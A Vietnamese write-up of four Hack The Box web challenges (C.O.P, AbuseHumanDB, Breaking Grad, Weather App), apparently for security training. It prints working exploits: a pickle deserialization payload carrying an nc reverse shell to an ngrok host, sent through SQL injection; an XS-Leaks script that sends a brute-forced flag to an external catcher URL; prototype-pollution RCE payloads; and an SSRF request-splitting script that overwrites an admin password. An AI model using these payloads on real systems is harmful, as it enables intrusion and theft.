# C.O.P

### Build Dockerfile

![image](https://user-images.githubusercontent.com/86275419/227902491-e1487d10-5df1-40c5-8d95-adf611ea9454.png)

* Note: lần đầu build nếu fail thì ae build lại là ok nhé. Web mặc định chạy trên port 1337

![image](https://user-images.githubusercontent.com/86275419/227897018-6d2cc8ac-ed92-49ce-a8b0-03f2e6682081.png)

Challenge cho ta một trang web bán hàng có chức năng xem sản phẩm

## Phân tích source code

Web được xây dựng bằng ngôn ngữ Python, do kiến thức code web bằng python không có nhiều nên trong bài này chỗ nào không hiểu mình ném hết lên chatGPT là ra. EX:

![image](https://user-images.githubusercontent.com/86275419/227953728-aa220781-b0d8-4afb-b86f-2bc532848f09.png)

Sau khi review source code thì mình cần chú ý vào một số đoạn sau:

- File `database.py`:

![image](https://user-images.githubusercontent.com/86275419/227924263-7af0384b-b1ae-4af6-bc81-0d66a665fb79.png)

Đầu tiên khi chạy app thì nó sẽ tạo database sqlite3 và lưu 4 đối tượng Item được serialize bằng hàm `pickle.dumps(x)` 

- File `routes.py`

![image](https://user-images.githubusercontent.com/86275419/227957772-d58b5e79-e5fb-4f6c-9e9e-8151a122730e.png)

Khi vào trang chủ (`/`) thì nó sẽ gọi hàm `index()`. Hàm này sẽ render giao diện từ file `index.html` và gán biến `products` (chứa các đối tượng Item được lưu vào database khi khởi tạo app) vào `index.html`

Khi vào từng sản phẩm (`/view/<product_id>`) thì nó sẽ gọi hàm `product_details(product_id)`. Hàm này sẽ render giao diện từ file `index.html` và gán biến `product` (chứa đối tượng Item với product_id tương ứng) vào `index.html`

- File `models.py`

![image](https://user-images.githubusercontent.com/86275419/227979925-0630961b-c067-492e-aa3d-cc0c07685421.png)

File này chứa các hàm có chức năng truy vấn CSDL

+ Hàm `select_by_id(product_id)` được gọi bởi hàm `product_details(product_id)` bên trên, hàm này có điểm cần lưu ý là `product_id` được gán trực tiếp vào câu truy vấn mà không có bất kì hàm filter nào cả => có thể tấn công SQLi. Một lưu ý nữa là hàm chỉ nhận một câu truy vấn `one=True`, có nghĩa là nếu có thể Injection thì ta chỉ có thể inject các Syntax nối thêm vào câu lệnh gốc để tạo thành 1 câu lệnh SQL duy nhất
+ Hàm `all_products()` được gọi bởi hàm `index()` bên trên

- File `index.html`:

![image](https://user-images.githubusercontent.com/86275419/227983616-291b6ac7-4ad7-4f3e-9f0f-f56c7ecd845f.png)

- Ta sẽ chú ý vào đoạn code Jinja
+ Ở đây sẽ có một vòng lặp lấy từng phần tử của `products` và gán vào `product`, `product` sẽ được deserialize bởi hàm pickle (bên dưới) và gán vào biến item
+ Thân vòng lặp là các thẻ để in ra nội dung của đối tượng được deserialize (item)

- File `item.html`:

![image](https://user-images.githubusercontent.com/86275419/227990161-e05034ef-23b9-4b7d-9551-3a4844bbd82b.png)

File có chức năng hiển thị chi tiết 1 product

Nội dung tương tự file `index.html` nhưng ở đây sẽ chỉ có 1 phần tử `product`

- File `app.py`:

![image](https://user-images.githubusercontent.com/86275419/227994551-4c3db590-58b4-4343-8abe-be7f7a11b32d.png)

Ta sẽ chú ý vào hàm `pickle_loads(s)`
+ Hàm này sẽ chịu trách nhiệm deserialize, ở Task 3 mình đã được làm một bài về Serialization nên có thể nhận định đây khả năng cao là lỗ hổng của bài này
+ Không giống như bài Phineas, ở bài này hàm `pickle_loads(s)` ta sẽ không thể gọi trực tiếp, mà nó chỉ được gọi khi render giao diện, được gọi trong file `index.html` và `item.html`

=> Sau khi phân tích source code thì mình có thể nhận định được rằng bài này phải RCE mới đọc được Flag (vì trong code không hề có chức năng nào đọc file flag) và khả năng cao đang bị dính lỗ hổng Insecure Deserialization, bây giờ ta sẽ phải tìm cách cho payload đi qua hàm `pickle_loads(s)`, từ đó có thể RCE
+ Ngoài Insecure Deserialization thì bài này còn có lỗi SQL Injection và mình cũng nghĩ đến Blind SQLi vì database đang sử dụng Sqlite3 do task2 mình cũng đã làm và server phải có PHP. Nhưng bài này server đang chạy web bằng Python nên khả năng xảy ra lỗi này là không cao

## Solution
- Hàm `pickle_loads(s)` được call trong file `index.html` và `item.html`, tại đây dữ liệu truyền vào hàm để deserialize là các phần tử được truy vấn ra từ database. Trong hai file này thì ta sẽ chú ý đặc biệt vào file `item.html` vì:
+ Ta có thể tấn công SQL injection vào đây, từ đó có thể gây ra cho câu truy vấn trả về dữ liệu mà ta có thể kiểm soát (bằng cách sử dụng Union Select, các cách injection để tạo 2 câu truy vấn khác nhau sẽ bị chặn vì lý do như bên trên mình có giải thích)

- Ta sẽ quay lại câu truy vấn (models.py):

```
 def select_by_id(product_id):
     return query_db(f"SELECT data FROM products WHERE id='{product_id}'", one=True)
```

+ `product_id` sẽ được lấy trên URL khi ta view chi tiết từng sản phẩm (chi tiết trong file routes.py), đây sẽ là điểm để ta injection payload

-> Ở bài lab này mình sẽ inject vào một đoạn payload chứa reverse shell đã được serialize (giống như Task 3 mình có làm) vào `product_id` trên URL để làm cho câu truy vấn SQL trả về payload của mình, từ đó khi render giao diện trong file `item.html` payload sẽ được deserialize và ta có thể RCE. Do bài này mình không thể truyền trực tiếp payload vào như Task 3 nên phải custom lại code, và từ đây hậu quả của việc không hiểu rõ về lỗ hổng này bắt đầu:

```
import pickle
import base64
import requests

class PickleRCE(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

command = 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 0.tcp.ap.ngrok.io 14769 >/tmp/f' # Reverse Shell Payload Change IP/PORT

payload = base64.b64encode(pickle.dumps(PickleRCE())).decode()  # Crafting Payload

payload = f"' UNION SELECT '{payload}' --"

payload = requests.utils.requote_uri(payload)

print(payload)

```
Payload (Python 3.11.1):

`'%20UNION%20SELECT%20'gASVcAAAAAAAAACMAm50lIwGc3lzdGVtlJOUjFhybSAtZiAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAwLnRjcC5hcC5uZ3Jvay5pbyAxNDc2OSA+L3RtcC9mlIWUUpQu'%20--`

Result:

![image](https://user-images.githubusercontent.com/86275419/228025771-66aaaac1-4e36-4a26-a0f0-64747383dcea.png)

-> Fail sau nhiều lần thử sửa payload các thử mình vẫn fail mà không biết nguyên nhân lỗi từ đâu. Sau đó mình có tham khảo các write up làm theo cũng vẫn fail, lúc này mình tưởng rằng python đã update version mới và fix lỗi này nên không khai thác được nữa mà quên mất là khi build Docker thì version Python là cố định. Để chắc chắn rằng có thể do máy mình lỗi hoặc lab đang lỗi thì mình có nhờ một người ae test thử lại và người ae mình đã RCE được thành công với cách giống hệt mình đã làm bên trên. Lúc này thì mình vẫn chưa phát hiện ra vấn đề đang ở đâu, sau một lúc nghiên cứu lại thì bằng một cách thần kì nào đấy mình lên [web ide python online](https://www.online-python.com/) gen lại payload thử lại và thành công, lúc này mình đã lấy 2 payload so sánh với với nhau và phát hiện ra 2 payload cùng một code nhưng kết quả laị khác nhau, vậy thì chỉ có thể là do version:

IDE Online:

![image](https://user-images.githubusercontent.com/86275419/228031083-12ed2afb-b68b-43e1-a43d-34072193f293.png)

IDE myPC:

![image](https://user-images.githubusercontent.com/86275419/228031388-ddc9a95c-7531-41bd-805b-d591e072e756.png)

=> Python trên máy mình đang chạy version 3.11 nên lỗ hổng đã bị fix và không thể khai thác bằng cách trên, từ đoạn này mọi payload mình gen ra sẽ từ IDE online đang chạy Python version 3.8

Gen lại payload với đoạn code bên trên:

`'%20UNION%20SELECT%20'gASVcwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjFhybSAtZiAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAwLnRjcC5hcC5uZ3Jvay5pbyAxNDc2OSA+L3RtcC9mlIWUUpQu'%20--`

![image](https://user-images.githubusercontent.com/86275419/228033869-735f47bf-d0ed-4b0c-ba3f-cce5ad750f28.png)

Result:

![image](https://user-images.githubusercontent.com/86275419/228033072-0e68bff4-2e5a-4470-ad3d-2b0d79d5eb9f.png)

Exploit thành công


# AbuseHumanDB

Khi truy cập vào trang web thì ta sẽ được một trang có 2 chức năng chính là `Report Abusive Content By Humans`:

![image](https://user-images.githubusercontent.com/86275419/228646954-ac9e50ba-aede-4b8b-9d83-0a6368ccff46.png)

![image](https://user-images.githubusercontent.com/86275419/228647872-0961a578-ce6a-490a-94ee-a3bc73bea7a9.png)

và `Search Query`:

![image](https://user-images.githubusercontent.com/86275419/228647101-0ad5d0a3-7e09-4bc5-b3ac-005cd67dca21.png)

![image](https://user-images.githubusercontent.com/86275419/228647996-2dfc2a71-20ab-4a45-a71b-2bb9cd1af34f.png)

### Sau khi thử sử dụng trang web xong thì mình đi phân tích source code để tìm lỗ hổng

![image](https://user-images.githubusercontent.com/86275419/228648381-fc1218f9-edb2-4856-9936-b1375e9740b9.png)

Đây là một trang web được code bằng NodeJS, CSDL là sqlite

Đầu tiên khi vào web sẽ tạo database (file database.js):

![image](https://user-images.githubusercontent.com/86275419/228650383-55f6ba09-40fd-42a7-a419-2dfe83696188.png)

Ta thấy rằng Flag sẽ nằm ở database, và khác với các dữ liệu khác, cột `approved` của Flag sẽ là `0`

Ta tiếp tục xem file database:

![image](https://user-images.githubusercontent.com/86275419/228651246-e8a8932e-7838-4486-b49d-0794a25b1f8e.png)

Đây là các hàm để lấy dữ liệu ra trong database, ta thấy rằng tất cả truy vấn đều sử dụng statement nên việc tấn công SQL Injection vào đây là không thể

+ Để ý thêm ở các hàm lấy dữ liệu thì tham số (approved) mặc định là 1, mà flag của ta approved=0, có nghĩa là để lấy được flag thì ta cần truyền vào đối số là `0`

Ta sẽ đi tìm xem hàm nào gọi truy vấn CSDL, file routes\index.js:

- Trong file này có 2 hàm gọi truy vấn database:

![image](https://user-images.githubusercontent.com/86275419/228653070-e759ba9f-5cff-498a-90ec-a40768e8dfba.png)

Khi ta truy cập vào trang chủ của web thì hàm trên sẽ được gọi, hàm này khi gọi truy vấn database và truyền vào một đối số là một biến `isLocalhost(req)` (tương ứng là approved) để truy vấn toàn bộ report trong database có `isLocalhost(req)` (ta sẽ phân tích bên dưới) tương ứng là 0 (only flag) hoặc 1 (Tất cả report trừ Flag) 

Khi ta sử dụng chức năng Search Query thì nó sẽ gọi hàm bên dưới:

![image](https://user-images.githubusercontent.com/86275419/228655257-6e4c088e-ab27-4090-86be-7934d9862627.png)

+ Hàm này khi truy vấn database sẽ truyền vào 2 tham số là `query` và `isLocalhost(req)`. Biến query sẽ lấy giá trị từ parameter `q` (ta truyền vào) sau đó gán thêm ký tự `%` vào sau giá trị mà ta truyền vào (mục đính để dấu `%` sẽ match với tất cả các ký tự đằng sau giá trị ta truyền vào khi truy vấn db). Dưới đây là request khi ta Search Query:

![image](https://user-images.githubusercontent.com/86275419/228657099-d42dedcc-6a7e-41a6-a87b-9e65e4843a99.png)

=> Ta thấy rằng ở hai hàm trên, điều kiện để ta có thể lấy được Flag là `isLocalhost(req)=0`, sẽ sẽ đi xem biến `isLocalhost(req)`:

![image](https://user-images.githubusercontent.com/86275419/228658448-802d3874-9fa5-4739-8a44-1904052477ec.png)

Ta có thể thấy rằng để `isLocalhost(req)=0` thì request phải được thực hiện từ ip `127.0.0.1:1337`(localhost với port 1337), còn nếu truy vấn từ máy bên ngoài vào thì `isLocalhost(req)=1` -> `approved=1` -> Không lấy được Flag. Và theo tìm hiểu của mình thì việc bypass ở đây là không thực hiện được

=> Vậy bây giờ ta cần phải tìm cách tạo request từ chính localhost của trang web để lấy Flag, đến đây mình nghĩ đến lỗi SSRF

Ta sẽ đi tìm thêm một số thông tin khác trong File code để tìm solution:

Ở trong routes/index.js ta có còn một hàm sau:

![image](https://user-images.githubusercontent.com/86275419/228660952-84fe7078-3e27-4a4a-8321-919c93955dea.png)

Hàm này là hàm xử lý chức năng `Report Abusive Content By Humans` 
+ Hàm này sẽ lấy url mà ta truyền vào, sau đó đưa vào một con bot (hàm visitPage) để truy cập tới url đó. Dưới đây là hàm visitPage()(file bot.js):

![image](https://user-images.githubusercontent.com/86275419/228663923-4a3cc87d-d11c-4377-b8d6-d0bed5a84016.png)

Một đống code JS bên trên mình cũng không hiểu lắm, nhưng sau khi search thì nhìn chung nó sẽ visit tới cái url của mình truyền vào 

Sau một thời gian đọc code thì mình có vector tấn công như sau: đầu tiên mình sẽ gửi url (localhost) tới con bot để nó truy cập vào url đó và vào trang chủ, lúc này `isLocalhost(req)=0` và trả về cho con bot Flag. Nhưng ở vector này mình đang gặp vấn đề là làm sao để lấy Flag từ con bot về mình :v

Sau một hồi suy nghĩ gaf quá không ra được kỹ thuật nào có thể áp dụng vào đây nên đành lên mạng xem sol để tìm hint làm tiếp, và mình tìm được keyword `XS-Leaks`

![image](https://user-images.githubusercontent.com/86275419/228668617-6bda2212-e928-4759-b458-3f8802246936.png)

Reading:

https://cheatsheetseries.owasp.org/cheatsheets/XS_Leaks_Cheat_Sheet.html

https://xsleaks.dev/

https://book.hacktricks.xyz/pentesting-web/xs-search

![image](https://user-images.githubusercontent.com/86275419/228676870-a991ffc7-45d1-4781-b342-0b5ed9cc5b50.png)

Sau khi đọc một số bài viết thì mình hiểu nôm na rằng lỗ hổng này cho phép hacker sử dụng các thông tin được trao đổi giữa các trang web tưởng chừng như các thông tin đó là vô nghĩa, nhưng từ những thông tin đó hacker có thể sử dụng để suy luận ra những thông tin nhạy cảm

Ta sẽ quay lại web để phân tích tiếp code xem chỗ nào có thể áp dụng XS-Leaks

![image](https://user-images.githubusercontent.com/86275419/228677580-654a4e37-f4b0-44b7-8027-010fbc0964c3.png)

Chức năng Search, khi ta truy vấn db mà không có bản ghi nào trả về thì nó sẽ response lỗi 404, còn nếu có sẽ là 200
+ Ở đây ta để ý trường query lúc nãy mình có giải thích ký tự `%`, bây giờ ta sẽ brute-force từng ký tự của Flag, nếu ký tự đó nằm trong Flag sẽ response 200 còn không thì sẽ response status 404 (error)

Lợi dụng điều này, khi ta sử dụng XS-Leaks nó sẽ sử dụng các Error Events (.onerror(), .onload()) để thể hiện cho chúng ta thấy khi nó request tới một url có xảy ra lỗi (404) hay không (200)

Vector: ta sẽ tạo một trang web chứa một đoạn script thực hiện XS-Leaks và có chức năng gửi lại kết quả cho mình -> gửi link chứa trang web này cho con bot -> bot truy cập link -> script thực hiện trên con bot với ip localhost (`isLocalhost(req)=0` -> `approved=0`) -> bot gửi request và brute-force từng ký tự Flag tại chức năng `Search Query` -> Sau khi brute-force xong, bot gửi lại flag cho mình

Script 

```
<html>
<script>
var ip = '127.0.0.1:1337'; // Only IP
var myWeb = 'https://duypt.requestcatcher.com'; //URL get Flag, change it
var flag = 'HTB{5w33t';
var chars = '-+!@abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_';
var url = `http://${ip}/api/entries/search?q=`

async function getPartialFlag(char){ //Hàm thực hiện gửi request tới url để xem có lỗi hay không
 return new Promise((resolve, reject)=>{
 const script = document.createElement("script");
 script.src = url+encodeURIComponent(flag+char);
 script.onload = () => char==='}' ? reject(char):resolve(char); //Nếu thành công (200) sẽ thực hiện
 script.onerror = () => reject(char); //Nếu không thành công (404) sẽ thực hiện
 document.head.appendChild(script);
 });
}
async function getFlag(chars) {  //Hàm thực hiện brute-force flag
var b = false; var char;
 for(var i=0; i < chars.length; i++){
 char = chars[i];
 await getPartialFlag(char).then((res) => {flag=flag.concat(res); b = res==='}' ? true:false; i=0} , (res)=> { } );
 if(b) break;}

fetch(`${myWeb}/?flag=${flag}`, {method:'get'}); // Thực hiện trả về kết quả cho hacker 
};
getFlag(chars);
</script>
<html>

```

Mọi người cần built một web để máy bên HTB có thể truy cập vào được, ở đây mình dùng apache + ngrok
+ Apache là web server 
+ Ngrok để mình tạo một IP public link với web của mình 

![image](https://user-images.githubusercontent.com/86275419/228799910-40ff186c-ce18-483b-bb69-5dada805528f.png)

Thực hiện gửi link web của mình vào chức năng `Report Abusive Content By Humans` 

![image](https://user-images.githubusercontent.com/86275419/228794997-df9e1d95-ec16-40cc-82b6-8250c23e0248.png)

Giờ ta chỉ ngồi đợi Flag về thôi

![image](https://user-images.githubusercontent.com/86275419/228799148-9edfc8d8-c336-4df0-953e-c01879bfa4f4.png)

# Breaking Grad

Bài lab cho ta một trang web check điểm của Kenny Baker và Jack Purvis xem có pass hay không

![image](https://user-images.githubusercontent.com/86275419/229105788-f7d16a6b-1ef8-4519-8d95-1211fc403ae7.png)

Thử check thì hai ông đều tạch, và không có chức năng gì khác :v  

Mình bắt request thì khi check điểm web sẽ gửi đi một object có key là "name" và value là tên của người được check điểm 

![image](https://user-images.githubusercontent.com/86275419/229107847-7fffd467-65de-4041-908c-6d8c87230576.png)

Giờ ta sẽ đi xem source code để tìm vuln của bài này

![image](https://user-images.githubusercontent.com/86275419/229112155-90a149cc-5203-4405-bd81-33e871c589ff.png)

Web này được code bằng NodeJS và flag nằm ở web root, giống như bài 1 thì khả năng cao bài này phải RCE để đọc Flag

- File routes/index.js

![image](https://user-images.githubusercontent.com/86275419/229109188-158093e1-098a-43c7-b869-4cd3e615edaf.png)

+ Đây là file định tuyến cho cả trang web, ở đây ta thấy có 3 luồng chính, luồng đầu tiên là khi ta truy cập vào trang chủ, luồng thứ 2 là khi ta truy cập vào "/debug/:action", và cuối cùng là luồng xử lý khi ta check điểm "/api/calculate"

+ Mình sẽ đi vào chức năng check điểm của chương trình vì đây là chức năng chính và có khả năng có lỗ hổng nhất

![image](https://user-images.githubusercontent.com/86275419/229110279-3d53f0b2-e95f-46f5-b848-f25825746753.png)

Ở đây đầu tiên nó sẽ tạo ra một biến student được gán giá trị từ `ObjectHelper.clone(req.body)`, ta sẽ phân tích sang hàm này 

![image](https://user-images.githubusercontent.com/86275419/229111357-49c798b2-c9dd-4c87-9e13-fb58807d314f.png)

Hàm này có chức năng clone object, nếu object chứa key là `__proto__` thì sẽ trả về một object rỗng `{}`. Nếu mọi người đã từng tìm hiểu qua lỗ hổng `Prototype pollution` thì có thể đoán được rằng khả năng cao ở bài này đang bị lỗ hổng này và có thể RCE, thậm chí đoạn code này giống y như trên [Hacktricks](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce), nhưng ở bài này có thêm hàm filter nếu ta sử dụng `__proto__` và không có hàm để tạo `child_process`. Giờ ta sẽ đi phân tích tiếp code

![image](https://user-images.githubusercontent.com/86275419/229116555-39be01a1-5566-43d2-857c-ca82a4486a2c.png)

Đoạn code trên có chức năng kiểm tra điểm của người đó xem có đỗ hay là không, nếu không đỗ thì sẽ trả vể kết quả gồm `n` + 10 ký tự `oO` random + `pe`, nếu đỗ sẽ trả về `Passed`. Nhìn chung ở đây không có lỗ hổng

Ờ bài này còn có một chức năng khác khi ta truy cập vào `/debug/:action`, ta sẽ xem code ở chức năng này

![image](https://user-images.githubusercontent.com/86275419/229121269-30f3794b-1e28-4d78-b23a-18647401117a.png)

Ở đây ta có thể chắc chắn rằng bài này có thể RCE thông qua lỗ hổng `Prototype pollution` vì ở trong chức năng này có một hàm có thể tạo `child_process` đó là `fork`. 

Vì trong bài này đã filter khi ta sử dụng `__proto__` nhưng ta vẫn còn một cách khác để truy cập vào `Object.prototype` đó là thông qua `constructor.prototype` 

Giờ ta chỉ cần lên [HackTricks](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce#poisoning-constructor.prototype) lấy payload về và chạy thôi. Mọi người lưu ý là do payload ở hacktricks nằm trong dấu `'` nên khi sử dụng ta phải bỏ hai dấu `\\` ở `\\\"` để nó khỏi convert thành `\"`

Lúc đầu mình thử cat flag ra luôn nhưng không được nên phải list thư mục ra xem 

`{"constructor": {"prototype": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\"child_process\").execSync(\"ls\").toString())//"}}}}`

![image](https://user-images.githubusercontent.com/86275419/229122951-28a7040a-8ac3-436f-bbf6-259a9c09fc2b.png)

Kết quả

![image](https://user-images.githubusercontent.com/86275419/229122996-ac73bc22-0255-4406-a762-b809343903c5.png)

File flag là `flag_e1T6f`, đã có tên file giờ ta sẽ cat ra và lấy flag thôi

`{"constructor": {"prototype": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\"child_process\").execSync(\"cat flag_e1T6f\").toString())//"}}}}`

![image](https://user-images.githubusercontent.com/86275419/229123302-ebee915e-8ff1-4eb5-ba08-059474d7d988.png)

Kết quả 

![image](https://user-images.githubusercontent.com/86275419/229123466-5123ccbd-fd2b-4886-bdbd-7479d0d6c7ae.png)

# Weather App

Truy cập vào web sẽ cho ta một trang xem nhiệt độ

![image](https://user-images.githubusercontent.com/86275419/229190075-69f1b3ae-9afa-40f0-a306-08616b003d60.png)

Không còn chức năng nào khác nên mình vào đọc source code luôn

![image](https://user-images.githubusercontent.com/86275419/229191561-6d9fe4bc-3be3-40cd-932f-4d7363681263.png)

Lúc đầu vào app sẽ tạo database với 1 user có username là `admin` và password sẽ được gen ngẫu nhiên

![image](https://user-images.githubusercontent.com/86275419/229191901-9c077d2b-7d37-47e7-8869-f8f512c93438.png)

Ở file routes/index.js mình thấy app còn chức năng đăng ký, đăng nhập

![image](https://user-images.githubusercontent.com/86275419/229192396-caf98590-d837-44f8-81be-7e938cfb9ff8.png)

Ở chức năng đăng ký, khi ta gửi username-password lên code sẽ kiểm tra xem nếu đến từ localhost sẽ thực hiện các chức năng bên dưới, nếu không sẽ trả về lỗi 401

![image](https://user-images.githubusercontent.com/86275419/229194906-7232828a-2137-4dc3-a4be-52dfc05fe3fe.png)

Do bên trên mình truy cập không từ localhost nên sẽ bị lỗi 401

Phân tích tiếp chức năng đăng ký thì nếu ta truy cập từ localhost chương trình sẽ lấy username, password của mình và lưu vào database

![image](https://user-images.githubusercontent.com/86275419/229195525-7566abe7-00e1-4a0b-9d24-31224a6e2f51.png)

Ở đây mình thấy user với pass được gán trực tiếp vào câu truy vấn nên ta có thể tấn công SQL Injection vào đây, đến đây mình thấy bài này có nét tương đồng với lab2

Phân tích chức năng đăng nhập

![image](https://user-images.githubusercontent.com/86275419/229196081-3211dee8-326e-4e4f-af93-8d11f3b67e83.png)

Ở đây chương trình sẽ lấy username, password trong request và thực hiện check
+ Nếu là admin sẽ trả về Flag
+ Nếu không là admin sẽ trả về `You are not admin`

![image](https://user-images.githubusercontent.com/86275419/229196709-48469caf-65cd-4678-a7a9-09162d76d393.png)

Đây là hàm check admin, ta thấy rằng hàm sử dụng statement nên không thể injection vào đây. Do lúc tạo db thì username là `unique` nên ta sẽ không thể chèn thêm một user có tên `admin` -> Phải sửa password trong db  

Ngoài register và login thì mình còn thấy chức năng để getWeather

![image](https://user-images.githubusercontent.com/86275419/229197817-d866ad99-d9a9-4333-9412-24c7acaa8f06.png)

Chương trình sẽ lấy 3 giá trị của object trong request 

![image](https://user-images.githubusercontent.com/86275419/229198280-77aa42ab-6382-42c7-9d16-55e0f4299014.png)

3 giá trị này sẽ được truyên vào hàm `getWeather()`, ta sẽ đi xem hàm này 

![image](https://user-images.githubusercontent.com/86275419/229198680-e23d43dc-6538-4450-9419-f4629b140e03.png)

Ta để ý url khi truyền vào hàm `HttpGet()`, 3 giá trị ta truyền vào được gán trực tiếp vào url, ta sẽ đi xem hàm này

![image](https://user-images.githubusercontent.com/86275419/229198959-1e02a8ca-368d-49c3-be5a-6b532ece2844.png)

Hàm này sẽ thực hiện một request với method get ra bên ngoài

Đến đây mình có ngay ý tưởng tấn công bài này do đã làm 1 bài ở task 2 ý tưởng cũng tương tự

Ở bài này để lấy được Flag thì phải có 2 điều kiện sau:
+ Request phải đến từ localhost
+ Phải sửa lại password của admin thông qua SQL Injection

Đầu tiên để có request từ localhost ta sẽ tận dụng chức năng getWeather(), ở hàm này sẽ có một hàm tạo request tới url mà url này ta có thể inject vào (127.0.0.1) sau đó truy cập tới chức năng `register` thực hiện injection sửa thông tin mật khẩu của admin sang mật khẩu mà ta đưa vào

Đến đây mình đang gặp vấn đề ở chỗ do khi get payload ở chức năng register bằng method POST nên mình đang không biết cách nào có thể truyền paload bằng method POST lên URL (bài này sẽ không sử dụng được XS Leaks do code exploit của mình sẽ không thực thi được trong hàm này) 

Mình thử lên google tìm cách bypass thì tìm được [SSRF via Request Splitting](https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/)

Hiểu nôm na lỗi này sẽ cho phép bạn chèn vào request gốc một hoặc nhiều request nữa thông qua các ký tự đặc biệt như `\r \n`, đây là lỗi xảy ra với những phiên bản NodeJS < 10 do mặc định NodeJS sử dụng `latin1` để encode nên khi encode các ký tự unicode như `\u010D \u010A` sẽ thành `\r \n`. Ví dụ mình sẽ sử dụng vào bài này như sau

Mình chèn vào `endpoint` payload:

```127.0.0.1/\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010AContent-Type:\u0120application/x-www-form-urlencoded\u010D\u010AContent-Length:\u012093\u010D\u010A\u010D\u010Ausername=admin&password=admin\u010D\u010A\u010D\u010AGET\u0120/?lol=```

![image](https://user-images.githubusercontent.com/86275419/229216071-70bf581d-f123-4de7-adbf-22bfaa316fc2.png)

Tại hàm này khi nối payload vào vị trí endpoint và request sau đó sẽ có dạng:

```
GET 127.0.0.1/ HTTP/1.1
Host: 127.0.0.1

POST /register HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 93

username=admin&password=admin

GET /?lol=/data/2.5/weather?q=Hanoi,VN&units=metric&appid=10a62430af617a949055a46fa6dec32f HTTP/1.1
// Something headers ...

```

Code exploit (python):

```
import requests

url = "http://206.189.113.249:31731" //Change it

username="admin"

password="') ON CONFLICT(username) DO UPDATE SET password = 'admin';--" // Change pass here

password = password.replace(" ","\u0120").replace("'", "%27").replace('"', "%22")
contentLength = len(username) + len(password) + 19

endpoint = '127.0.0.1/\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010AContent-Type:\u0120application/x-www-form-urlencoded\u010D\u010AContent-Length:\u0120' + str (contentLength) + '\u010D\u010A\u010D\u010Ausername='+username + '&password='+ password + '\u010D\u010A\u010D\u010AGET\u0120/?lol='

json={'endpoint':endpoint,'city':'Hanoi','country':'VN'}

res=requests.post(url=url+'/api/weather',json=json)
```

Vào trang login nhập username và password vừa đổi

![image](https://user-images.githubusercontent.com/86275419/229217892-57f8ab18-2732-49ee-ae09-66974db9d4ea.png)

Bus luôn

![image](https://user-images.githubusercontent.com/86275419/229218363-47aaf2c5-ea7a-40c5-a173-2474e50d12eb.png)



 



